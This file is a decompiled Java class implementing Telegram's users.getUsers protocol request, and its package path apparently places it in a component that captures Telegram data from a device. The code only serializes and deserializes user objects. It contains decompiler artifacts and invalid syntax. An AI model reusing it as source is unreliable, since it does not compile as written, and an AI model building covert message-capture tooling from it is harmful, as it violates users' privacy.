package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_users_getUsers
  extends TLObject
{
  public static int constructor = 227648840;
  public ArrayList id;
  
  public TLRPC$TL_users_getUsers()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.id = localArrayList;
  }
  
  public TLObject deserializeResponse(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    TLRPC.Vector localVector = new com/vvt/capture/telegram/internal/TLRPC$Vector;
    localVector.<init>();
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    int j = 0;
    for (;;)
    {
      TLRPC.User localUser;
      if (j < i)
      {
        int k = paramAbstractSerializedData.readInt32(paramBoolean);
        localUser = TLRPC.User.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
        if (localUser != null) {}
      }
      else
      {
        return localVector;
      }
      ArrayList localArrayList = localVector.objects;
      localArrayList.add(localUser);
      j += 1;
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    paramAbstractSerializedData.writeInt32(481674261);
    int j = this.id.size();
    paramAbstractSerializedData.writeInt32(j);
    i = 0;
    TLRPC.InputUser localInputUser = null;
    for (int k = 0; k < j; k = i)
    {
      localInputUser = (TLRPC.InputUser)this.id.get(k);
      localInputUser.serializeToStream(paramAbstractSerializedData);
      i = k + 1;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_users_getUsers.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */